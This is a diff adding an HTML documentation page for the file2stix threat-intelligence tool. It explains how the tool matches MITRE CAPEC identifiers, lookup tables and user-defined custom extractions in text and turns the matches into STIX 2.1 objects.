+<p>For example, if the uploaded text contained <code>1053.005</code> it would match to the ATT&amp;CK Object <a href="https://github.com/mitre/cti/blob/master/enterprise-attack/attack-pattern/attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9.json">1053.005: Scheduled Task</a> and an SRO would be created between the Report SDO and this Attack Pattern SDO.</p>
+<h2 id="22-mitre-capec-observables">22. MITRE CAPEC Observables<a class="headerlink" href="#22-mitre-capec-observables" title="Permanent link">&para;</a></h2>
+<p>CAPECs are extracted in a very similar way to ATT&amp;CK objects, using a dictionary.</p>
+<p>file2stix can identify ATT&amp;CK data found in text using keyword matches on the <code>name</code> and <code>external_references.external_id</code> (where <code>"source_name": "capec"</code>) fields inside the STIX object representing it.</p>
+<p>Take <a href="https://github.com/mitre/cti/blob/master/capec/2.1/attack-pattern/attack-pattern--0cf857f6-afa4-4f0c-850f-58a4f11df157.json">CAPEC-170 Web Application Fingerprinting</a>.</p>
+<p>You will see;</p>
+<pre><code class="language-json">    &quot;name&quot;: &quot;Web Application Fingerprinting&quot;,
+</code></pre>
+<p>and</p>
+<pre><code class="language-json">{
+    &quot;external_id&quot;: &quot;CAPEC-170&quot;,
+    &quot;source_name&quot;: &quot;capec&quot;,
+    &quot;url&quot;: &quot;https://capec.mitre.org/data/definitions/170.html&quot;
+},
+</code></pre>
+<p>Therefore, the dictionary entries to identify this CAPEC Object are <code>Web Application Fingerprinting</code> and <code>CAPEC-170</code> (case insensitive).</p>
+<p>The following CAPEC data types are supported in this way;</p>
+<ul>
+<li>CAPEC (<code>attack-pattern</code>)</li>
+</ul>
+<p>In the case of a dictionary match to a MITRE CAPEC STIX Object, no new object is created. A new Relationship Object is created between the created STIX Report SDO with imported CAPEC STIX Object. The CAPEC STIX Object remains unmodified.</p>
+<p>For example, if the uploaded text contained CAPEC-170 it would match to the CAPEC Object <a href="https://github.com/mitre/cti/blob/master/capec/2.1/attack-pattern/attack-pattern--0cf857f6-afa4-4f0c-850f-58a4f11df157.json">CAPEC-170 Web Application Fingerprinting</a> and an SRO would be created between the Report SDO and this Attack Pattern SDO.</p>
+<h2 id="23-lookups">23. Lookups<a class="headerlink" href="#23-lookups" title="Permanent link">&para;</a></h2>
+<p>For matches that cannot be easily captured by patterns, but are widely known (i.e. not suited to custom extraction for all file2stix users), automatic lookup tables have been added. You can view the lookups in <code>file2stix/lookups</code>.</p>
+<p>There lookups work by comparing the input text to the text matches in the lookup files.</p>
+<p>The lookup file is structured like so;</p>
+<pre><code class="language-csv"># extraction string / regex, type (either string / regex), stix object used for match
+&quot;EXTRACTION STRING&quot;,string,STIX-OBJECT-TYPE
+&quot;EXTRACTION REGEX&quot;,regex,STIX-OBJECT-TYPE
+</code></pre>
+<p>When the extraction (either string or regular expression) matches the input text, then it will create a STIX 2.1 object of the type defined.</p>
+<p>If you do not want to use a lookup, you can pass the <code>--ignore-lookup</code> flag, followed by the file name (excluding file extension), e.g. <code>--ignore-lookup threat-actors threat-actors</code>.</p>
+<p>You can modify these lookups, or add new ones, however we generally recommend you use custom extractions to do this (which are defined in the same way) because your changes to lookups might be lost with file2stix updates.</p>
+<h2 id="24-custom-extractions">24. Custom Extractions<a class="headerlink" href="#24-custom-extractions" title="Permanent link">&para;</a></h2>
+<p>You can also write your own custom extractions using either exact text matches or regular expressions.</p>
+<p>Custom extractions can be written and stored in a plain text file that can be passed when running the script as <code>--custom-extraction-file</code>.</p>
+<p>Inside the custom extraction file you must specify an</p>
+<ol>
+<li>extraction string or regex</li>
+<li>extraction type (either <code>regex</code> or <code>sting</code>)</li>
+<li>the STIX 2.1 Object or MITRE / CAPEC Object to use when a match is detected</li>
+</ol>
+<p>file2stix uses <code>re</code> for regex matching.</p>
+<p>You can pass multiple custom extractions on each line of the file like so (this is the same format as for lookups too);</p>
+<pre><code class="language-csv">&quot;EXTRACTION STRING&quot;,string,STIX-OBJECT-TYPE
+&quot;EXTRACTION REGEX&quot;,regex,STIX-OBJECT-TYPE
+</code></pre>
+<p>For example;</p>
+<pre><code class="language-csv">&quot;Fancy Bear&quot;,string,attack-pattern
+</code></pre>
+<p>And</p>
+<pre><code class="language-csv">&quot;Fancy*&quot;,regex,attack-pattern
+</code></pre>
+<p>Would both match the text "Fancy Bear" found in an input file.</p>
+<p>The secound would also match "FancyBear", "Fancy Cat", "Fancy Dog", ect.</p>
+<p>The following STIX 2.1 Objects are supported by custom extractions:</p>
+<ul>
+<li><a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070618">Attack Pattern</a> (<code>attack-pattern</code>)</li>
+<li><a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070621">Campaign</a> (<code>campaign</code>)</li>
+<li><a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070624">Course of Action</a> (<code>course-of-action</code>)</li>
+<li><a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070636">Infrastructure</a> (<code>infrastructure</code>)</li>
+<li><a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070639">Intrusion Set</a> (<code>intrustion-set</code>)</li>
+<li><a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070645">Malware</a> (<code>malware</code>)</li>
+<li><a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070663">Threat Actor</a> (<code>threat-actor</code>)</li>
+<li><a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070666">Tool</a> (<code>tool</code>)</li>
+</ul>
+<p>e.g. to search a document for the string "RYUK" and create a Malware STIX 2.1 SDO if a match is identified;</p>
+<pre><code class="language-csv">&quot;ryuk&quot;,string,malware
+</code></pre>
+<p>You can also create multiple custom extractions in the same file by adding multiple lines, e.g.</p>
+<pre><code class="language-csv">&quot;ryuk&quot;,malware
+&quot;darkhotel&quot;,string,malware
+&quot;patch&quot;,string,course-of-action
+</code></pre>
+<p>You can see an example custom extraction file in <code>tests/file_inputs/custom_extractions/test_extractions.txt</code></p>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+    <nav class="md-footer__inner md-grid" aria-label="Footer" >
+      
+        
+        <a href="../extractions/" class="md-footer__link md-footer__link--prev" aria-label="Previous: 3.1. Overview" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              3.1. Overview
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../extractions-observed-mode/" class="md-footer__link md-footer__link--next" aria-label="Next: 3.3. Observed Mode" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              3.3. Observed Mode
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; Signals Corps
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+      
+      
+    
+    <a href="https://www.signalscorps.com/" target="_blank" rel="noopener" title="www.signalscorps.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M352 256c0 22.2-1.2 43.6-3.3 64H163.3c-2.2-20.4-3.3-41.8-3.3-64s1.2-43.6 3.3-64h185.4c2.2 20.4 3.3 41.8 3.3 64zm28.8-64h123.1c5.3 20.5 8.1 41.9 8.1 64s-2.8 43.5-8.1 64H380.8c2.1-20.6 3.2-42 3.2-64s-1.1-43.4-3.2-64zm112.6-32H376.7c-10-63.9-29.8-117.4-55.3-151.6 78.3 20.7 142 77.5 171.9 151.6zm-149.1 0H167.7c6.1-36.4 15.5-68.6 27-94.7 10.5-23.6 22.2-40.7 33.5-51.5C239.4 3.2 248.7 0 256 0s16.6 3.2 27.8 13.8c11.3 10.8 23 27.9 33.5 51.5 11.6 26 21 58.2 27 94.7zm-209 0H18.6c30-74.1 93.6-130.9 172-151.6-25.5 34.2-45.3 87.7-55.3 151.6zM8.1 192h123.1c-2.1 20.6-3.2 42-3.2 64s1.1 43.4 3.2 64H8.1C2.8 299.5 0 278.1 0 256s2.8-43.5 8.1-64zm186.6 254.6c-11.6-26-20.9-58.2-27-94.6h176.6c-6.1 36.4-15.5 68.6-27 94.6-10.5 23.6-22.2 40.7-33.5 51.5-11.2 10.7-20.5 13.9-27.8 13.9s-16.6-3.2-27.8-13.8c-11.3-10.8-23-27.9-33.5-51.5zM135.3 352c10 63.9 29.8 117.4 55.3 151.6-78.4-20.7-142-77.5-172-151.6h116.7zm358.1 0c-30 74.1-93.6 130.9-171.9 151.6 25.5-34.2 45.2-87.7 55.3-151.6h116.6z"/></svg>
+    </a>
+  
+    
+    
+      
+      
+    
+    <a href="https://join.slack.com/t/signalscorps-public/shared_invite/zt-1exnc12ww-9RKR6aMgO57GmHcl156DAA" target="_blank" rel="noopener" title="join.slack.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M94.12 315.1c0 25.9-21.16 47.06-47.06 47.06S0 341 0 315.1c0-25.9 21.16-47.06 47.06-47.06h47.06v47.06zm23.72 0c0-25.9 21.16-47.06 47.06-47.06s47.06 21.16 47.06 47.06v117.84c0 25.9-21.16 47.06-47.06 47.06s-47.06-21.16-47.06-47.06V315.1zm47.06-188.98c-25.9 0-47.06-21.16-47.06-47.06S139 32 164.9 32s47.06 21.16 47.06 47.06v47.06H164.9zm0 23.72c25.9 0 47.06 21.16 47.06 47.06s-21.16 47.06-47.06 47.06H47.06C21.16 243.96 0 222.8 0 196.9s21.16-47.06 47.06-47.06H164.9zm188.98 47.06c0-25.9 21.16-47.06 47.06-47.06 25.9 0 47.06 21.16 47.06 47.06s-21.16 47.06-47.06 47.06h-47.06V196.9zm-23.72 0c0 25.9-21.16 47.06-47.06 47.06-25.9 0-47.06-21.16-47.06-47.06V79.06c0-25.9 21.16-47.06 47.06-47.06 25.9 0 47.06 21.16 47.06 47.06V196.9zM283.1 385.88c25.9 0 47.06 21.16 47.06 47.06 0 25.9-21.16 47.06-47.06 47.06-25.9 0-47.06-21.16-47.06-47.06v-47.06h47.06zm0-23.72c-25.9 0-47.06-21.16-47.06-47.06 0-25.9 21.16-47.06 47.06-47.06h117.84c25.9 0 47.06 21.16 47.06 47.06 0 25.9-21.16 47.06-47.06 47.06H283.1z"/></svg>
+    </a>
+  
+    
+    
+      
+      
+    
+    <a href="https://github.com/signalscorps" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant"], "search": "../assets/javascripts/workers/search.5bf1dace.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.078830c0.min.js"></script>
+      
+    
+  </body>
+</html>
